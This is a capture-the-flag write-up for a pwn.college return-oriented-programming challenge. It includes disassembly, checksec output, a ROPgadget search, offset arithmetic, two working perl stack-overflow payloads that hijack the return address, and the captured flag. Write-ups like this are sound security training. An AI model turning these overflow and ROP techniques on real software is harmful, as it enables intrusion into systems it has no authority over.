---
Platform: Pwn College
Tittle: Tricky Control Hijack - Hard
Date & Time: 2026 - 08 - 26 11:48
tags:
  - Challenge
  - BinaryExploitation
  - ROP
---
---
## FLAG  : `pwn.college{gMDOthm11cwCgSlyjJA2Hi3OWcI.dBDMzwiN4kDOyEzW}`

---
## Solution 1 :
After checking the functions address (`info funcitons`) on `GDB`, we knew that our target address was `0x401eb8`, it is `win_authed` functions.

>[!example]- Challenge Disas
>```asm
>Dump of assembler code for function challenge:
   0x0000000000401fd5 <+0>:	endbr64
   0x0000000000401fd9 <+4>:	push   rbp
   0x0000000000401fda <+5>:	mov    rbp,rsp
   0x0000000000401fdd <+8>:	add    rsp,0xffffffffffffff80
   0x0000000000401fe1 <+12>:	mov    DWORD PTR [rbp-0x64],edi
   0x0000000000401fe4 <+15>:	mov    QWORD PTR [rbp-0x70],rsi
   0x0000000000401fe8 <+19>:	mov    QWORD PTR [rbp-0x78],rdx
   0x0000000000401fec <+23>:	mov    QWORD PTR [rbp-0x60],0x0
   0x0000000000401ff4 <+31>:	mov    QWORD PTR [rbp-0x58],0x0
   0x0000000000401ffc <+39>:	mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000402004 <+47>:	mov    QWORD PTR [rbp-0x48],0x0
   0x000000000040200c <+55>:	mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000402014 <+63>:	mov    QWORD PTR [rbp-0x38],0x0
   0x000000000040201c <+71>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000402024 <+79>:	mov    QWORD PTR [rbp-0x28],0x0
   0x000000000040202c <+87>:	mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000402034 <+95>:	mov    WORD PTR [rbp-0x18],0x0
   0x000000000040203a <+101>:	mov    BYTE PTR [rbp-0x16],0x0
   0x000000000040203e <+105>:	mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000402046 <+113>:	mov    QWORD PTR [rbp-0x8],0x1000
   0x000000000040204e <+121>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000402052 <+125>:	mov    rsi,rax
   0x0000000000402055 <+128>:	lea    rdi,[rip+0x10b4]        # 0x403110
   0x000000000040205c <+135>:	mov    eax,0x0
   0x0000000000402061 <+140>:	call   0x401100 <printf@plt>
   0x0000000000402066 <+145>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040206a <+149>:	lea    rax,[rbp-0x60]
   0x000000000040206e <+153>:	mov    rsi,rax
   0x0000000000402071 <+156>:	mov    edi,0x0
   0x0000000000402076 <+161>:	call   0x401120 <read@plt>
   0x000000000040207b <+166>:	mov    DWORD PTR [rbp-0xc],eax
   0x000000000040207e <+169>:	cmp    DWORD PTR [rbp-0xc],0x0
   0x0000000000402082 <+173>:	jns    0x4020b0 <challenge+219>
   0x0000000000402084 <+175>:	call   0x4010d0 <__errno_location@plt>
   0x0000000000402089 <+180>:	mov    eax,DWORD PTR [rax]
   0x000000000040208b <+182>:	mov    edi,eax
   0x000000000040208d <+184>:	call   0x401160 <strerror@plt>
   0x0000000000402092 <+189>:	mov    rsi,rax
   0x0000000000402095 <+192>:	lea    rdi,[rip+0x109c]        # 0x403138
   0x000000000040209c <+199>:	mov    eax,0x0
   0x00000000004020a1 <+204>:	call   0x401100 <printf@plt>
   0x00000000004020a6 <+209>:	mov    edi,0x1
   0x00000000004020ab <+214>:	call   0x401150 <exit@plt>
   0x00000000004020b0 <+219>:	lea    rdi,[rip+0x10a5]        # 0x40315c
   0x00000000004020b7 <+226>:	call   0x4010e0 <puts@plt>
   0x00000000004020bc <+231>:	mov    eax,0x0
   0x00000000004020c1 <+236>:	leave
   0x00000000004020c2 <+237>:	ret
End of assembler dump.
>```

If we see the `challenge` function above, there are no any `win` function called, so our idea is to change the `return address` to point to `win_authed` function. But, before that, let's check the file with `checksec` :
```shell
[*] '/challenge/binary-exploitation-control-hijack-2'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

So, there are no Canary here, and NX is enabled, which mean we can't execute command on stack.

Let's check for `win_authed` asm : 

>[!example]- win_authed Disas
>```asm
>Dump of assembler code for function win_authed:
   0x0000000000401eb8 <+0>:	endbr64
   0x0000000000401ebc <+4>:	push   rbp
   0x0000000000401ebd <+5>:	mov    rbp,rsp
   0x0000000000401ec0 <+8>:	sub    rsp,0x10
   0x0000000000401ec4 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401ec7 <+15>:	cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000401ece <+22>:	jne    0x401fd2 <win_authed+282>
   0x0000000000401ed4 <+28>:	lea    rdi,[rip+0x112d]        # 0x403008
   0x0000000000401edb <+35>:	call   0x4010e0 <puts@plt>
   0x0000000000401ee0 <+40>:	mov    esi,0x0
   0x0000000000401ee5 <+45>:	lea    rdi,[rip+0x1138]        # 0x403024
   0x0000000000401eec <+52>:	mov    eax,0x0
   0x0000000000401ef1 <+57>:	call   0x401140 <open@plt>
   0x0000000000401ef6 <+62>:	mov    DWORD PTR [rip+0x3144],eax        # 0x405040 <flag_fd.5701>
   0x0000000000401efc <+68>:	mov    eax,DWORD PTR [rip+0x313e]        # 0x405040 <flag_fd.5701>
   0x0000000000401f02 <+74>:	test   eax,eax
   0x0000000000401f04 <+76>:	jns    0x401f53 <win_authed+155>
   0x0000000000401f06 <+78>:	call   0x4010d0 <__errno_location@plt>
   0x0000000000401f0b <+83>:	mov    eax,DWORD PTR [rax]
   0x0000000000401f0d <+85>:	mov    edi,eax
   0x0000000000401f0f <+87>:	call   0x401160 <strerror@plt>
   0x0000000000401f14 <+92>:	mov    rsi,rax
   0x0000000000401f17 <+95>:	lea    rdi,[rip+0x1112]        # 0x403030
   0x0000000000401f1e <+102>:	mov    eax,0x0
   0x0000000000401f23 <+107>:	call   0x401100 <printf@plt>
   0x0000000000401f28 <+112>:	call   0x401110 <geteuid@plt>
   0x0000000000401f2d <+117>:	test   eax,eax
   0x0000000000401f2f <+119>:	je     0x401f49 <win_authed+145>
   0x0000000000401f31 <+121>:	lea    rdi,[rip+0x1128]        # 0x403060
   0x0000000000401f38 <+128>:	call   0x4010e0 <puts@plt>
   0x0000000000401f3d <+133>:	lea    rdi,[rip+0x1144]        # 0x403088
   0x0000000000401f44 <+140>:	call   0x4010e0 <puts@plt>
   0x0000000000401f49 <+145>:	mov    edi,0xffffffff
   0x0000000000401f4e <+150>:	call   0x401150 <exit@plt>
   0x0000000000401f53 <+155>:	mov    eax,DWORD PTR [rip+0x30e7]        # 0x405040 <flag_fd.5701>
   0x0000000000401f59 <+161>:	mov    edx,0x100
   0x0000000000401f5e <+166>:	lea    rsi,[rip+0x30fb]        # 0x405060 <flag.5700>
   0x0000000000401f65 <+173>:	mov    edi,eax
   0x0000000000401f67 <+175>:	call   0x401120 <read@plt>
   0x0000000000401f6c <+180>:	mov    DWORD PTR [rip+0x31ee],eax        # 0x405160 <flag_length.5702>
   0x0000000000401f72 <+186>:	mov    eax,DWORD PTR [rip+0x31e8]        # 0x405160 <flag_length.5702>
   0x0000000000401f78 <+192>:	test   eax,eax
   0x0000000000401f7a <+194>:	jg     0x401fa8 <win_authed+240>
   0x0000000000401f7c <+196>:	call   0x4010d0 <__errno_location@plt>
   0x0000000000401f81 <+201>:	mov    eax,DWORD PTR [rax]
   0x0000000000401f83 <+203>:	mov    edi,eax
   0x0000000000401f85 <+205>:	call   0x401160 <strerror@plt>
   0x0000000000401f8a <+210>:	mov    rsi,rax
   0x0000000000401f8d <+213>:	lea    rdi,[rip+0x114c]        # 0x4030e0
   0x0000000000401f94 <+220>:	mov    eax,0x0
   0x0000000000401f99 <+225>:	call   0x401100 <printf@plt>
   0x0000000000401f9e <+230>:	mov    edi,0xffffffff
   0x0000000000401fa3 <+235>:	call   0x401150 <exit@plt>
   0x0000000000401fa8 <+240>:	mov    eax,DWORD PTR [rip+0x31b2]        # 0x405160 <flag_length.5702>
   0x0000000000401fae <+246>:	cdqe
   0x0000000000401fb0 <+248>:	mov    rdx,rax
   0x0000000000401fb3 <+251>:	lea    rsi,[rip+0x30a6]        # 0x405060 <flag.5700>
   0x0000000000401fba <+258>:	mov    edi,0x1
   0x0000000000401fbf <+263>:	call   0x4010f0 <write@plt>
   0x0000000000401fc4 <+268>:	lea    rdi,[rip+0x113f]        # 0x40310a
   0x0000000000401fcb <+275>:	call   0x4010e0 <puts@plt>
   0x0000000000401fd0 <+280>:	jmp    0x401fd3 <win_authed+283>
   0x0000000000401fd2 <+282>:	nop
   0x0000000000401fd3 <+283>:	leave
   0x0000000000401fd4 <+284>:	ret
End of assembler dump.
>```

Look at here : 
```asm
   0x0000000000401ec4 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401ec7 <+15>:	cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000401ece <+22>:	jne    0x401fd2 <win_authed+282>
```

This is the checking mechanism, so the register `$edi (lower address of $rdi)` must equal to `0x1337`. `$rdi` often assigned with the first argumen of a function. To modify its value, we need a `ROPgadget` to find some usefull instruction such as `pop rdi; ret`. With this, we can modify the value of `$rdi` as we want.

Checking `ROPgadget` on the file : 
```shell
hacker@binary-exploitation~tricky-control-hijack-hard:/challenge$ ROPgadget --binary binary-exploitation-control-hijack-2 | grep "pop rdi"
0x00000000004021b3 : pop rdi ; ret
```

Here we got the address of the instruction, so the previous `ret_address` will be pointing to this set of instruction. Here is the Stack overview :

| **High Address**                   | Value    | Description                                                                  |
| ---------------------------------- | -------- | ---------------------------------------------------------------------------- |
| Old Ret Address (8 Bytes)          | 0x4021b3 | Point to ROP gadget instructions                                             |
| Insert `$rdi` value (8 Bytes)      | 0x1337   | `pop rdi` will consume this                                                  |
| Ret Address (8 Bytes) : win_authed | 0x401eb8 | This is the `ret` after `pop rdi`, and it should be pointing to `win_authed` |
Next, we need to count the offset between `buffer` to `ret_address` : 
- `0x7fff12a73380` : This is the address of first buffer.
- `0x7fff12a733e8` : This is the `ret_addr` address.

>[!caution] 
>Both Address must be check on the same session

Count the offset : `e8 - 80 =104`, so We need `104` padding.

Now, everything is set, let's build our payload :
```bash
perl -e 'print "A"x104 . "\xb3\x21\x40"."\x00"x5 . "\x37\x13"."\x00"x6 . "\xb8\x1e\x40"."\x00"x5 '
```

Here is the result : 
```shell
hacker@binary-exploitation~tricky-control-hijack-hard:/challenge$ perl -e 'print "A"x104 . "\xb3\x21\x40"."\x00"x5 . "\x37\x13"."\x00"x6 . "\xb8\x1e\x40"."\x00"x5 ' | ./binary-exploitation-control-hijack-2
Send your payload (up to 4096 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{gMDOthm11cwCgSlyjJA2Hi3OWcI.dBDMzwiN4kDOyEzW}
```

---
## Solution 2 : 
We can solve this by skipping the checking mechanism :
```asm
   0x0000000000401ec4 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401ec7 <+15>:	cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000401ece <+22>:	jne    0x401fd2 <win_authed+282>
   0x0000000000401ed4 <+28>:	lea    rdi,[rip+0x112d]        # 0x403008
```

We can skip to `challenge+28`, this would work because 
```asm
   0x0000000000401eb8 <+0>:	endbr64
   0x0000000000401ebc <+4>:	push   rbp
   0x0000000000401ebd <+5>:	mov    rbp,rsp
   0x0000000000401ec0 <+8>:	sub    rsp,0x10
```
The register `rsp` and `rbp` weren't used in further instruction, so this mean it will be fine untill the `flag` printed. 

So, instead of modify the return address to `0x401eb8` we just modify it to `0x401ed4`.
Here is the payload : 
```shell
perl -e 'print "A"x104 . "\xd4\x1e\x40"."\x00"x5'
```

---
### Key Takeaways : 
- ROP Gadget is a usefull tool that contain a lot of useful instruction that help us on ROP case.

---
